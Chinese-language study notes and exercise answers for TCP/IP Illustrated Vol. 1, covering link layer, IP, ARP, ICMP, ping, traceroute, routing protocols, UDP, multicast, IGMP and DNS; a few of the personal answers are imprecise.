&#x2F; I P协议族每一层的稳健性原则。这个原则的参考对象是什么？ 123主机需求RFC 1122和1123[Braden 1989a, 1989b]。RFC 1122针对链路层、网络层和运输层；RFC1123针对应用层。自由的接收，保守的发送。 1.4 获取一份最新的赋值R F C拷贝。“quote of the day”协议的有名端口号是什么？哪个 R F C对该协议进行了定义？ 1234567https://www.rfc-editor.org/ RFC 865 - Quote of the Day Protocol 端口 17 RFC1340中，quote of the day协议定义了qotd服务，端口号TDP／UDP17，RFC865对其进行了定义。服务器侦听 TCP（UDP ） 端口 17 上的 TCP(UDP) 连接。建立连接后，会向连接发送一条短消息（并且接收到的任何数据都会被丢弃） 1.6 获取一份RFC 1000的拷贝，了解R F C这个术语从何而来。 https://www.rfc-editor.org/info/rfc1000， RFC始于1969年，由当时就读加州大学洛杉矶分校（UCLA）的斯蒂芬·克罗克（Stephen D. Crocker）用来记录有关ARPANET开发的非正式文档，他是第一份RFC文档的撰写者。最终演变为用来记录互联网规范、协议、过程等的标准文件。基本的互联网通信协议都有在RFC文件内详细说明。 1.7 几个关键的图 TCP &#x2F;UDP: TCP是可靠的运输层协议，通过超时重传，三次握手等来保证。UDP是不可靠的。 IP：提供不可靠的无连接的数据报传输服务，靠上层实现可靠传输。 ICMP：IP的附属协议，用于交换错误报文以及其他重要信息。 IGMP：Internet 组管理协议，它用来把一个UDP数据报多播到多个主机。多播是一种一对多的通信方式，允许一个主机发送的数据包被多个主机接收。这在一些应用中非常有用，比如在线会议、网络电视等。为了有效地进行多播，路由器需要知道哪些主机想要接收特定的多播数据包。这就是IGMP的作用。主机会使用IGMP向路由器发送报告，告诉路由器它想要加入（或离开）哪个多播组。 ARP&#x2F;RARP：提供IP到MAC地址之间的转换。 第二章链路层1、链路层的功能 为IP模块发送接收数据报 为ARP模块发送ARP请求和接收应答 为RARP发送RAPR请求和接收应答 2、协议 (以太网、令牌环网、FDDI（光纤分布式数据接口）及RS-232串行线路) 以太网链路层协议 SLIP PPP(adsl宽带) 串行线路IP（SLIP）和点对点协议（PPP）是两种数据链路层协议，主要用于建立直接的互联网连接。它们通常应用于以下设备： 拨号和DSL调制解调器：这些设备使用PPP或SLIP协议在用户的计算机和互联网服务提供商（ISP）之间建立直接的互联网连接。 路由器：路由器可能使用PPP或SLIP协议在不同的网络之间建立连接。 串行设备：如一些老式的终端设备，可能使用SLIP协议通过串行线路进行通信。 无线和卫星设备：这些设备可能使用PPP协议进行数据传输。 请注意，尽管SLIP和PPP都可以用于这些设备，但现在PPP更常用，因为它提供了错误检测和配置功能，而SLIP没有这些功能。 ​ Loopback 换回接口 127.0.0.1（localhost）,处理IP数据报的过程 3、串行线路吞吐量计算如果线路速率是9600 b&#x2F;s，而一个字节有8 bit，加上一个起始比特和一个停止比特，那么 线路的速率就是960 B&#x2F;s（字节&#x2F;秒）。 当只有交互通信时，如果线路速率是 9600 b&#x2F;s，那么任何方向上的 1字节数据（假设有 5个字节的压缩帧头）往返一次都大约需要 12.5 ms。它比前面提到的100~200 ms要小得多。需要注意的是，由于帧头从 4 0个字节压缩到 5个字节，使得1字节数据往返时间从85 ms减到12.5 ms。 1212.5ms = (5+1)* 10 * 2 / 9600 * 100085 ms = (40+1)* 10 * 2 /9600 * 1000 4、习题如果你的系统支持 n e t s t a t( 1 )命令（参见 3 . 9节），那么请用它确定系统上的接口及其 M T U。 第三章 IP： 网际协议1、概念IP 提供不可靠、无连接的数据报传送服务。不可靠指的是发生错误，丢弃数据包，发送ICMP报文。无连接指的是IP 不维护任何关于后续数据报的状态信息。 2、字段 3、IP路由选择的功能 寻找完全匹配项，交付下一站路由器或者接口 寻找网络号匹配项，交付下一站路由器或者接口 寻找默认路由，交付下一站路由器 4、习题1）环回地址必须是1 2 7 . 0 . 0 . 1吗？ 不，任何网络I D为1 2 7的A类地址都是可行的。 2） 在图3 - 6中指出有两个以上网络接口的路由器。 kpno 有5个接口，三个点对点，两个以太网，gateway 三个接口，两个点对点，一个以太网，R10有四个以太网接口，netlab 三个接口，两个点对点，一个以太网。 3） 子网号为16 bit的A类地址与子网号为8 bit的B类地址的子网掩码有什么不同？ 没有区别，255.255.255.0 4） 阅读RFC 1219 [Tsuchiya 1991]，学习分配子网号和主机号的有关推荐技术。 5） 子网掩码2 5 5 . 2 5 5 . 0 . 2 5 5是否对A类地址有效？ 有效但不建议。 6） 你认为为什么3 . 9小节中打印出来的环回接口的 M T U要设置为1 5 3 6？ In order to allow Ethernet II and IEEE 802.3 framing to be used on the same Ethernet segment, a unifying standard, IEEE 802.3x-1997, was introduced that required that EtherType values be greater than or equal to 1536. That value was chosen because the maximum length (MTU) of the data field of an Ethernet 802.3 frame is 1500 bytes and 1536 is equivalent to the number 600 in the hexadecimal numeral system. Thus, values of 1500 and below for this field indicate that the field is used as the size of the payload of the Ethernet frame while values of 1536 and above indicate that the field is used to represent an EtherType. The interpretation of values 1501–1535, inclusive, is undefined. 7） T C P &#x2F; I P协议族是基于一种数据报的网络技术，即 I P层，其他的协议族则基于面向连接的 网络技术。阅读文献[Clark 1988]，找出数据报网络层提供的三个优点。 数据报降低了路由器对应连接状态的需求。 数据报提供了基本的构件，在它的上面可以构造不可靠的（UDP）和可靠的（TCP）的运输层。 数据报代表了最小的网络层假定，使得可以使用很大范围的数据链路层服务。 第四章 ARP协议1、基本概念A R P为I P地址到对应的硬件地址之间提供动态映射。简单来讲就是网络通信前，主机并不知道某个IP位于哪个主机的哪个接口，于是它发送一个ARP广播包，询问某IP的MAC地址是什么，收到广播包的目标主机回复ARP请求，收到ARP响应后，主机更新ARP缓存，准备通信。 arp -a 可以查看本机的arp 高速缓存。 示例 进行FTP连接 2 、 ARP报文的格式 抓了一个广播报文，对应报文格式进行分析 硬件类型字段为 1：以太网地址。协议类型字段为 0 x 0 8 0 0 即表示I Pv4地址。硬件地址长度和协议地址长度，对于以太网上 I P地址的A R P请求或应答来说，它们的值分别为 6和4。 操作字段有四种操作类型， A R P请求（1）、A R P应答（2）、R A R P请求（3）和R A R P应答（4）。接着是发送端硬件地址、发送端I P地址、目的端硬件地址和目的端I P地址。 3、代理ARP​ 代理ARP是ARP协议的一个变种。 对于没有配置缺省网关的计算机要和其他网络中的计算机实现通信，网关收到源计算机的ARP 请求会使用自己的MAC 地址与目标计算机的IP地址对源计算机进行应答。 代理ARP就是将一个主机“作为”另一个主机对收到的ARP请求进行应答。 4、免费ARP指的是主机发送ARP寻找自己的IP地址，发生在系统引导期间进行接口配置的时候，发送端IP和目的IP一致。 作用：（1）广播通知IP地址对应的MAC地址，（2）防止IP冲突。 5、习题1）当输入命令以生成类似图4 - 4那样的输出时，发现本地A R P快速缓存为空以后，输入命令 bsdi ％ rsh svr4 arp -a 如果发现目的主机上的 A R P快速缓存也是空的，那将发生什么情况？ (该命令将在s v r 4 主机上运行a r p -a命令）。 执行rsh建立连接时，发送没有对方的MAC地址，就会发送ARP广播，然后目标主机回应的同时，把本地主机的IP和MAC关系也存入ARP缓存表，最后就可以建立连接。 2）请描述如何判断一个给定主机是否能正确处理接收到的非必要的 A R P请求的方法。 测试没必要的ARP请求是否会更新高速缓存。 只有在ARP缓存中的映射关系过期或不存在时，本地主机才会发送ARP请求来更新或获取最新的MAC地址。 只要收到目标MAC是自己的ARP reply包或arp广播包(包括ARP request和ARP reply)，都会接受并缓存。 ARP replay: (1) 目标MAC是自己 (2) ARP replay 广播 ARP request: (1) ARP 请求广播 免费ARP也属于请求广播，只不过目的IP是自身 3）由于发送一个数据包后 A R P将等待响应，因此 4 . 2节所描述的步骤7可能会持续一段时间。 你认为A R P将如何处理在这期间收到相同目的 I P地址发来的多个数据包？ 链路层应该保存(而不是丢弃)去往同一未解析IP地址的每组分组中的至少一个(最新的)分组，并在地址被解析后发送保存的分组。讨论:不遵循此建议会导致每次交换的第一个数据包丢失。虽然高层协议通常可以通过重传来处理数据包丢失，但数据包丢失确实会影响性能。例如，丢失TCP打开请求会导致初始往返时间估计值被夸大。基于UDP的应用程序(如域名系统)受到的影响更严重。 4）在4 . 5节的最后，我们指出Host Requirements RFC和伯克利派生系统在处理活动 A R P表目 的超时时存在差异。那么如果我们在一个由伯克利派生系统的客户端上，试图与一个正 在更换以太网卡而处于关机状态的服务器主机联系，这时会发生什么情况？如果服务器 在引导过程中广播一份免费 A R P，这种情况是否会发生变化？ 伯克利派生系统尝试通信，直到20分钟超时后，删除该缓存，重新请求arp，通信成功。 广播免费ARP，伯克利派生系统更新缓存，通信成功。 第五章 RARP协议1、概念有本地磁盘的一般从磁盘的配置文件中获取IP地址，无盘机则从接口卡上读取MAC地址，然后发送一份RARP请求，请求获取IP地址（RARP响应中）。 2、分组格式与ARP基本一致，帧类型为0x8035，请求的操作代码是3 ，应答操作代码是4。 请求是广播形式（硬件层，不经过路由转发），应答是单播，一般以最先收到的应答为准。 3、习题 3.1 RARP需要不同的帧类型字段吗？ A R P和R A R P都使用相同的值0 x 0 8 0 6吗？ 不一定需要，因为OP字段已经可以区分ARP和RARP，但是一半还是区分了，RARP的帧类型是0x8035。 3.2 在一个有多个R A R P服务器的网络上，如何防止它们的响应发生冲突？ 分为主服务器和次服务器，次服务器加一个随机的延迟再响应或者用于回复重复的请求。 第六章 ICMP协议1、引言ICMP用于传递差错信息以及其他用户需要注意的信息。正式规范在RFC792. 报文格式如下 2、报文的类型ICMP报文分为查询报文和差错报文， ICMP地址掩码请求用于无盘系统在引导过程中获取自己的子网掩码。 ICMP时间戳请求允许系统向另一个系统查询当前的时间。 ICMP端口不可达报文格式如下： 3、习题3.1 在6.2节的末尾，我们列出了5种不发送ICMP差错报文的特殊条件。如果这些条件不满足而我们又在局域网上向一个似乎不存在的端口号发送一份广播UDP数据报，这时会发生什么样的情况？可能会冲突，造成网络不可用。 3.2 阅读RFC [Braden 1989a]，注意生成一个ICMP端口不可达差错是否为“必须”，“应该”或者“可能”。这些信息所在的页码和章节是多少？可能 3.3 阅读RFC 1349 [Almquist 1992]，看看IP的服务类型字段（见图3-2）是如何被ICMP设置的？发送一个ICMP差错总是将TOS置为0。发送一个ICMP查询请求可以将TOS置为任何值，但是发送相应的应答必须将TOS置为相同的值。 3.4 如果你的系统提供netstat命令，请用它来查看接收和发送的ICMP报文类型。netstat -s 第七章 ping7.1 概念ping程序是对两个TCP&#x2F;IP系统连通性进行测试的基本工具。它只利用ICMP回显请求和回显应答报文，而不用经过传输层（TCP&#x2F;UDP）。Ping服务器一般在内核中实现ICMP的功能。 7.2 ping 特殊功能Ping还给我们提供了检测IP记录路由和时间戳选项的机会。 7.3 习题7.3.1 若把bsdi和slip主机之间的SLIP链路设置为9600 b&#x2F;s，请计算这时的RTT。假定默认的数据是56字节。 SLIP 每个字节含有8bit数据、1bit起始位和1bit结束位，也就是每个字节10bit , 9600 b&#x2F;s 也就是 960B&#x2F;s (56+20+8+2)&#x2F;960 * 2 &#x3D; 17.9 S 7.3.2、当前BSD版中的ping程序允许我们为ICMP报文的数据部分指定一种模式（数据部分的前8个字节不用来存放模式，因为它要存放发送报文的时间）。如果我们指定的模式为0xc0，请重新计算上一题中的答案（提示：阅读2.4节）。 （86+56-8）&#x2F;960* 2 另外48字节是因为56字节的数据部分的最后48字节必须被转义. 7.3.3、 使用压缩SLIP（CSLIP，见2.5节）是否会影响我们在7.2节中看到的ping输出中的时间值？ CSLIP通过压缩IP头部减少了数据包的大小，这在理论上可以减少数据包在网络中的传输时间，特别是在低带宽的连接上。然而，ping程序测量的往返时间（RTT）包括了多个组成部分： \\1. 数据包序列化时间：数据包从主机内存转移到网络接口的时间。\\2. 传输时间：数据包在物理网络中传输的时间。\\3. 传播延迟：信号在介质中传播的时间。\\4. 处理延迟：中间设备（如路由器）和目标主机处理数据包的时间。\\5. 排队延迟：数据包在网络设备中等待处理和转发的时间。 CSLIP压缩主要影响的是传输时间，因为它减少了数据包的大小。但是，传输时间只是RTT的一部分。在高速网络中，传输时间可能只占RTT的一小部分，而传播延迟和处理延迟可能更为显著。因此，即使CSLIP减少了传输时间，整体的RTT可能仍然受到其他延迟因素的显著影响。 此外，ICMP报文的数据部分通常很小，因此即使IP头部被压缩，对整个ICMP报文的大小影响也不大，从而对RTT的影响也较小。而且，CSLIP的压缩效果对于连续的TCP&#x2F;IP数据包更为显著，因为它可以省略多个数据包之间未发生变化的IP头部信息。对于偶尔发送的ICMP报文，压缩效果可能不那么明显。 总的来说，CSLIP可能会在一定程度上减少RTT，特别是在低带宽的网络中，但这种影响可能不大，而且可能被其他延迟因素所掩盖。 7.3.4、在图2-4中，ping环回地址与ping主机以太网地址会出现什么不同？ ping环回地址更快，差别在于以太网驱动程序识别这是一个本地IP地址。 第八章 traceroute8.1、原理 Traceroute程序的操作过程：发送一份TTL字段为1的IP数据报给目的主机。处理这份数据报的第一个路由器将TTL值减1，丢弃该数据报，并发回一份超时ICMP报文(code为0)。这样就得到了该路径中的第一个路由器的地址。然后Traceroute程序发送一份TTL值为2的数据报，这样我们就可以得到第二个路由器的地址。继续这个过程直至该数据报到达目的主机。 Traceroute程序发送一份UDP数据报给目的主机，但它选择一个不可能的值作为UDP端口号（大于30 000），使目的主机的任何一个应用程序都不可能使用该端口。因为，当该数据报到达时，将使目的主机的UDP模块产生一份“端口不可达”错误（见6.5节）的ICMP报文。这样，Traceroute程序所要做的就是区分接收到的ICMP报文是超时还是端口不可达，以判断什么时候结束。 8.2、习题 8.2.1、当IP将接收到的TTL字段减1，发现它为0时，将会发生什么结果？ 根据文章来讲，如果不是目标主机，则是会发一个超时ICMP报文；如果是目标主机则会发送一个端口不可达的ICMP差错报文。 8.2.2、traceroute程序是如何计算RTT的？将这种计算RT T的方法与ping相比较。 在windows 下，ping 程序发送的数据包中并未存放发送时间，RTT是ping内部自己计算的。 如下的response 中估计是时间戳互相减去得到的。 p i n g程序通过在I C M P报文数据中存放发送请求的时间值来计算往返时间。当应答返回 时，用当前时间减去存放在 I C M P报文中的时间值，即是往返时间。请求包里面没得，应答里面有。 而在Linux下，的确是存在发送时间戳的。 windows下的tracert，抓包的icmp包中也并未看到任何时间戳的位置。 Linux的Traceroute 也并未发现icmp 数据包中包含时间戳的位置，可能不同架构的实现是不同的。 8.2.3、（本习题与下一道习题是基于开发traceroute程序过程中遇到的实际问题，它们来自于traceroute程序源代码注释）。假设源主机和目的主机之间有三个路由器（R1、R2和R3），而中间的路由器（R2）在进入TTL字段为1时，将TTL字段减1，但却错误地将该IP数据报发往下一个路由器。请描述会发生什么结果。在运行traceroute程序时会看到什么样的现象？ 第1行输出是正确的，并且标识了R1，下一个探测分组启动时将TTL置为2，并且这个值被R1减为1。当R2收到这个分组时，把TTL从1减为0，但是错误地将它传递给了R3。R3看见进入的TTL是0就将超时的分组发送回来。这就意味着第2行输出（TTL为2）标识了R3，而不是R2。第3行输出正确地标识了R3。这个错误所表现出来的线索就是两个连续的输出行标识了同一个路由器。 8.2.4、同样，假设源主机和目的主机之间有三个路由器。由于目的主机上存在错误，因此，它总是将进入TTL值作为外出ICMP报文的TTL值。请描述这将发生什么结果，你会看到什么现象。 在这种情况下，TTL为1标识了R1，TTL为2标识了R2，TTL为3标识了R3，但是当TTL为4时，UDP数据报到达了目的地，其输入的TTL为1。ICMP端口不可达报文生成了，但它的TTL是1（错误地从进入的TTL复制而来）。这个ICMP报文到了R3，在那儿TTL被减1，报文被丢弃。没有生成一个ICMP超时报文，因为被丢弃的数据报时一个ICMP差错报文。 8.2.5、在图8-8运行例子中，我们可以在sun和netb之间的SLIP链路上运行tcpdump程序。如果指定-v选项，就可以看到返回ICMP报文的TTL值。这样，我们可以看到进入netb、butch、Gabby和enss142.UT.westnet.net的TTL值分别为255、253、252和249。这是否为我们判断是否存在丢失路由器提供了额外的信息？ 如果你看到的TTL值从255开始递减，这通常意味着发送源设置了TTL的最大值255。在你的例子中，netb的TTL值为255，butch为253，Gabby为252，enss142.UT.westnet.net为249。这表明数据包在到达netb和butch之间可能经过了一个路由器，在butch和Gabby之间没有经过路由器，在Gabby和enss142.UT.westnet.net之间经过了三个路由器。 8.2.6、SunOS和SVR4都提供了带-l选项的ping版本，以提供松源选路。手册上说明，该选项可以与-R选项（指定记录路由选项）一起使用。如果已经进入到这些系统中，请尝试同时用这两个选项。其结果是什么？如果采用tcpdump来观测数据报，请描述其过程。没答案。 8.2.7、比较ping和traceroute程序在处理同一台主机上客户的多个实例的不同点。 ping的客户把ICMP回显请求报文的标识符字段设置为它的进程ID。ICMP回显应答报文包含同样值的标识符字段。每个客户都要查看这个返回的标识符字段，并且只处理那些它发送过的报文。 traceroute程序在处理来自同一台主机上的多个客户端实例的请求时，使用了两个主要的机制来区分每个实例的数据包：源端口号和ICMP的标识符字段。 8.2.8、比较ping和traceroute程序在计算往返时间上的不同点。 上面已经说过。 8.2.9、我们已经说过，traceroute程序选取开始UDP目的主机端口号为33453，每发送一个数据报将此数加1。在1.9节中，我们说过暂时端口号通常是1024~5000之间的值，因此traceroute程序的目的主机端口号不可能是目的主机上所使用的端口号。在Solaris2.2系统中的情况也是如此吗？（提示：查看E.4节） 默认情况下Solaris 2.2从32768开始使用临时的UDP端口，所以目的主机上的目的端口已经被使用的机会更大 8.2.10、RFC 1393 [Malkin 1993b]提出了另一种判断到目的主机路径的方法。请问其优缺点是什么？ 优点： 无需额外数据包：由于路由信息是直接记录在原始数据包的IP选项中，因此不需要额外的ICMP Time Exceeded消息来进行每一跳的跟踪。 透明性：这种方法对于传输路径上的每个路由器是透明的，它们只需要在转发数据包时，将自己的地址添加到IP选项中。 简化网络负载：理论上，这种方法可以减少网络上的诊断流量，因为它不需要为了发现路径上的每一跳而发送和接收多个数据包。 缺点： 兼容性问题：并非所有的路由器都支持或允许在转发的数据包中处理IP选项，这可能导致路径信息不完整。 安全风险：记录数据包路径的能力可能会被恶意用户利用来进行网络侦察，从而识别网络的结构和潜在的脆弱点。 性能影响：处理IP选项需要额外的处理时间，这可能会对路由器的性能产生负面影响，尤其是在高速网络环境中。 数据包大小限制：IP头部的选项字段有长度限制，这可能限制了可以记录的路由器地址数量。 数据包被丢弃的风险：由于IP选项可能会增加数据包头部的大小，这可能导致数据包超过网络的最大传输单元（MTU），从而被某些路由器丢弃。 标准化和普及：RFC 1393没有被广泛采纳为标准实践，因此在实际网络中很少使用。 第九章 IP选路9.1 原理（静态选路） IP搜索路由表的步骤： 搜索匹配的主机地址； 搜索匹配的网络地址； 搜索默认表项 netstat -rn 显示路由表 G 代表该路由到一个网关 U代表该路由可用 H代表该路由到一个主机 D 该路由是被ICMP重定向报文创建 M 该路由被ICMP重定向报文修改 9.2 ICMP重定向差错 ICMP 重定向差错可以用来帮助选路由。如图所示，假设ernest-laptop主机的路由表中只有一个默认的路由选项Kongming20，当它要访问网络时，IP数据报首先发送给Kongming20，随后Kongming20发送它跟ernest-laptop在同一个局域网内，同样它还是要发送给路由器，于是它发送了一个icmp重定向报文给ernest-laptop，告诉他你以后不要发给我了，你可以直接发送给路由器，于是ernest-laptop更新自己的路由表，后续的数据报文就直接发送到路由器了，进而转发，直到目的主机。 9.3 ICMP路由器发现报文 主机在引导以后要广播或多播传送一份路由器请求报文。一台或更多台路由 器响应一份路由器通告报文。另外，路由器定期地广播或多播传送它们的路由器通告报文， 允许每个正在监听的主机相应地更新它们的路由表。 9.4 习题 9.4.1 为什么你认为存在两类ICMP重定向报文—网络和主机？ 答： 当ICMP标准第1次发布时，RFC 792 [Postel 1981b]所述的划分子网技术还没有使用。并且使用一个网络重定向而不是N个主机重定向（对于目的网络中的所有N个主机）也节省了路由表的空间 9.4.2 在9.4节开头列出的svr4主机上的路由表中，到主机slip（140.252.13.65）的特定路由是必需的吗？如果把这一项从路由表中删除会有什么变化？ 答： 不是必须的，删除后会发往默认路由，最终再经过ICMP重定向包，重建这个路由。 9.4.3 考虑有一电缆连接4.2BSD主机和4.3BSD主机。假定网络号是140.1。4.2BSD主机把主机号为全0的地址识别为广播地址(140.1.0.0)，而4.3BSD通常使用全1的主机号（140.1.255.255）发送广播。另外，4.2BSD主机在默认条件下要尽力转发接收到的数据报，尽管它们只有一个接口。请描述当4.2BSD主机收到一份目的地址为140.1.255.255的IP数据报时会发生什么事。 答： 因为4.2BSD主机并没有将其识别成广播地址，因此他会发送arp广播，寻找对应MAC地址，最终无回应，丢弃这个数据包。 9.4.4 继续前一个习题，假定有人在子网140.1上的某个系统ARP高速缓存中增加了一项（用arp命令）内容，指定IP地址140.1.255.255对应的以太网地址为全1（以太网广播地址）。请描述此时发生的情况 答： arp广播会收到回应，因此4.2BSD开始发送数据，然后局域网的主机就会接收，同时因为目的IP时140.1.255.255 又不断广播，最终导致网络熔断。 第10章 动态选路前言RIP、OSPF、BGP、无分类域间选路 Internet是以一组自治系统(AS，Autonomous System)的方式组织的，各个自治系统可以选择自治系统中各个路由器之间的选路协议。早期采用的是RIP协议，现在已经被OSPF替代。 此外还有外部网关协议EGP（Exterier Gateway Protocol）或域内选路协议的分隔选路协议用于不同自治系统之间的路由器。 10.1 RIP协议路由信息协议（RIP）是一种使用广泛的内部网关协议，使用的是距离矢量算法，以跳数作为网络度量值，使用UDP的520端口进行RIP通信，采用广播或者组播进行路由更新，最大跳数15跳，16跳代表不可达，所以只适用于中小型网络。RIP协议默认的路由更新周期是30S。 该协议有3个版本v、v2，RIPng。v1 不支持子网，无法支持可变长度子网掩码，并且不支持认证。v2 版本解决了以上问题。RIPng则用于IPV6地址。 工作原理： 初始化：从各接口发送RIP数据包，向相邻路由器请求完整的路由更新。 接受请求：对请求数据包进行处理，返回整个路由表。 接受响应：接收到响应，对路由表项进行更新。 路由更新：30s 一次发送应答消息给相邻路路由器。超时时间180s，180s内没收到路由更新信息，设置跳数为16，240s 则删除该路由信息。 触发路由更新：路由改变时，路由器发送该表的路由信息给相邻的路由器。 不足之处： 过于简单，以跳数为依据计算度量值，经常得出非最优路由 度量值以16为限，不适合大的网络 收敛性差，时间经常大于5分钟 10.2 OSPF：开放最短路径优先OSPF是除RIP外的另一个内部网关协议，是链路状态协议。ospf 不采用跳数，而是根据接口的吞吐率、拥塞状况、往返时间、可靠性等实际链路的负载能力定出路由的代价。 它采用的是每个路由器主动地测试与其邻站相连链路的状态，将这些信息发送给它的其他邻站，而邻站将这些信息在自治系统中传播出去。每个路由器接收这些链路状态信息，并建立起完整的路由表。采用IP数据报，协议号89。 优点： （1）、OSPF可以根据IP服务类型计算路由集。 （2）、给每个接口分配一个无维数的费用 （3）、存在多个相同费用的路由时，可流量平衡 （4）、支持子网 （5）、支持简单验证 （6）采用多播 （7）点对点链路，不需要每一端都有一个IP地址 10.3 BGP 边界网关协议BGP是一种不同自治系统的路由器之间进行通信的外部网关协议。BGP系统与其他 BGP系统之间交换网络可到达信息。这些信息包括数据到达这些网络所 必须经过的自治系统 AS中的所有路径。这些信息足以构造一幅自治系统连接图。然后，可以 根据连接图删除选路环，制订选路策略。 BGP与RIP和OSPF的不同之处在于BGP使用TCP作为其传输层协议。两个运行BGP的系统 之间建立一条TCP连接，然后交换整个BGP路由表。 BGP是一个距离向量协议，但是与（通告到目的地址跳数的）RIP不同的是，BGP列举了 到每个目的地址的路由。 10.4 CIDR：无类型域间选路CIDR采用13～27位可变网络ID，而不是A-B-C类网络ID所用的固定的8、16和24位。 10.5 习题（1）OSPF报文格式中有一个检验和字段，而 R I P报文则没有此项，这是为什么？ RIP报文基于UDP协议，UDP 有个校验和字段，OSPF基于IP协议，所有要增加校验和字段。 （２）OSPF的负载均衡对于传输层的影响是什么？ 可能造成分组的失序交付，计算的时间也可能出错。 第11章、UDP协议UDP提供是一个简单的面向数据报的传输层协议，头部只8个字节，源端口，目的端口，UDP长度，校验和。 UDP 的校验和是把若干个 16 bit字相加，不满的填充0字节，但是可能不发送。同时还设置了伪首部用于计算校验和，伪首部还包括源IP、目的IP 、8位协议、16位UDP长度。 IP 数据报的分片 UDP首部只出现在第一片数据中。 ICMP 不可达差错 发生ICMP不可达差错的另一种情况是，当路由器收到一份需要分片的数据报，而在IP首 部又设置了不分片（D F）的标志比特。 习题 IEEE 802 封装格式，向UDP数据包中插入多少字节的数据会引发分片？ 正常情况下 1500-20（IP 首部）-8 （UDP 首部）&#x3D; 1472 但是 IEEE 802 封装 多了8个字节的头部数据，因此需要再减去8 1472-8 &#x3D; 1464 所以插入1465个字节的数据会引发分片、 理解为什么除最后一片外，其他片中的数据长度均要求为 8字节的整数倍？ IP 头部的 片偏移：占13位。较长的分组在分片后，某片在原分组中的相对位置。以8字节为偏移。 UDP 数据报 引发的分片，如果被分成了四片，但是丢失了两片（３，４），重发的数据包（３，４）能否和当前的数据包组包？ 不能，IP首部的标识字段不同。 UDP数据报是根据目的U D P端口号进行分配的。这正确吗？ 有一些会根据目的IP地址，源IP地址和源端口号来过滤一个送往特定端口的数据报。 第12章、广播和多播广播和多播仅应用于UDP。对于以太网，当地址中 最高字节的最低位设置为 1时表示该地址是一个多播地址， 用十六进制可表示为 0 1 : 0 0 : 0 0 : 0 0 : 0 0 : 0 0。 网卡收到一个帧的过程: 帧校验出错，丢弃，正常则这个帧被传送给驱动程序，驱动程序校验协议、多播过滤等，校验通过，发送给下一层IP层，IP层根据源IP和目的IP进行过滤；校验通过发送给下一层（TCP&#x2F;UDP）; TCP(UDP) 进行可选的源端口过滤，随后进行目的端口检测，如果没有则发送一个ICMP不可达报文。 广播 四种广播地址： 受限的广播地址 255.255.255.255 该地址用于主机配置过程中 I P数据报的目的地址。路由器不转发。 指向网络的广播地址 ：主机号全1 如A 类 广播地址 netid.255.255.255 路由器必须转发。 指向子网的广播地址： 主机号全位1 且有特定子网号的地址，如发往128.1.2.255 的数据包，如果子网掩码是255.255.255.0，则说明是广播地址。 指向所有子网的广播地址： 子网号及主机号为全1 多播 多播组地址包括为 111 0的最高4 bit和多播组号。它们通常可表示为点分十进制数，范围 从224.0.0.0到239.255.255.255。 多播地址与以太网地址的转换 IANA拥有一个以太网地址块，即高位 24 bit为00:00:5e（十六进制表示），这意味着该地 址块所拥有的地址范围从 00:00:5e:00:00:00到00:00:5e:ff:ff:ff。IANA将其中的一半分配为多播 地址。为了指明一个多播地址，任何一个以太网地址的首字节必须是 01，这意味着与 I P多播 相对应的以太网地址范围从01:00:5e:00:00:00到01:00:5e:ff:ff:ff。 多播的过程 多播进程将目的 IP 地址指明为多播地址，设备驱动程序将它转换为相应的以太网地址，然后把数据发送出去。 这些接收进程必须通知它们的 IP层，它们 想接收的发往给定多播地址的数据报，并且设备驱动程序必须能够接收这些多播帧。这个过程 就是“加入一个多播组”（使用“接收进程”复数形式的原因在于对一确定的多播信息，在同一 主机或多个主机上存在多个接收者，这也是为什么要首先使用多播的原因）。 当一个主机收到多播数据报时，它必须向属于那个多播组的每个进程均传送一个复制。 习题 （1）广播是否增加了网络通信量？ 答： 没有，广播只是增加了主机处理时间。 ​ 不增加网络通信量：广播是一种将消息发送到网络上所有设备的通信方式。当广播消息发送时，它并不 会在网络中产生额外的数据传输量，因为消息只是被发送一次，而不是针对每个接收者都单独传输。 ​ 增加主机处理时间：尽管广播本身不会导致网络通信量的增加，但接收广播消息的每个主机都需要处理这个消息。这可能涉及到解析、检查、响应等操作，这些都需要主机的处理能力。因此，广播可能增加了网络中每个接收设备的额外主机处理时间。 （2）主机如何处理来自运行另一个协议族主机的广播？ 答： 类型字段如果显示是其他协议，设备驱动程序会丢弃。 （3）ping 向一个广播地址发送分组，字节为1473会发生错误，为什么吗？ 答： 因为广播不支持分片，以太网MTU是1500，最大支持1472。（1500-20-14-4） 第13章、IGMP：Internet组管理协议13.1 引言IGMP 用于支持主机和路由器进行多播的 。 IGMP被封装在IP数据报中，8个字节。IGMP报文格式如下，第一个字节前四位是版本信息，后四位是类型信息，类型位1 则代表是组播路由器发送的查询报文，为1 代表是主机发送的报告报文，第二字节未用，第三四两个字节是校验和，后四位是32位的组地址。查询报文中组播地址为0，报告报文中组播地址为主机要加入的组地址。 路由器通过定时向每一个接口发送查询报文来获悉哪些些主机的进程属于多播组。查询报文仅仅是为了确定某个多个多播地址还有存货主机。 13.2 习题（1）一个局域网中的主机采取什么措 施才能避免两台主机产生相同的随机时延？ 答： 生成随机数时，要采用针对主机唯一的值。 （2）U D P缺少两个通过M B O N E传送音频采样数据 的条件：分组失序检测和分组重复检测。你怎样在 U D P上增加这些功能？ 答： 增加序号和时间戳 第14章 DNS ： 域名系统14.1 基础 DNS是一种用于TCP&#x2F;IP的分布式数据库，提供主机到IP地址的解析。DNS系统是一个树状的结构，从上到下依次是根域名，顶级域名，二级域名等。只有上级域名才知道下一级域名的IP地址，所以查询一个域名的IP地址就是逐级查询，首选通过查询根域名服务器获取顶级域名服务器的IP地址，然后通过顶级域名服务器获得二级域名服务器的IP地址，依次，最后查询到域名的IP地址。 DNS的报文格式如下：12个字节首部和4个长度可变的字段组成。 DNS 查询报文的格式如下，gemini.tuc.noao.edu 以上述域名为例解释查询名，查询名首先是gemini的长度6，然后才是Gemini，随后是3，tuc, 4, nano , 3, edu ,最后以0结尾。查询类型最常用的就是A类型，PTR，CNAME等，查询类通常为１，表示互联网地址。 DNS响应中的资源记录部分的格式：域名同上查询名，类型同上查询类型，类同上查询类，生存时间一般是2天，资源数据长度一般取决于类型，资源数据就是返回的数据了。 查询类型： A记录 ： 定义了一个32位 IP地址 PTR： 指针记录用于指针查询一个IP对应的域名，IP地址看作为in-addr.arpa域下的一个域名，如140.252.1.29 可以写作 29.1.252.140.in-addr.arpa CNAME： 表示一个域名的别名 NS： 名字服务器记录，表示一个域的授权名字服务器 第15章 TFTP： 简单文件传送协议15.1 简介tftp 是一个简单的协议，适合于只读存储器，仅用于无盘系统进行系统引导。 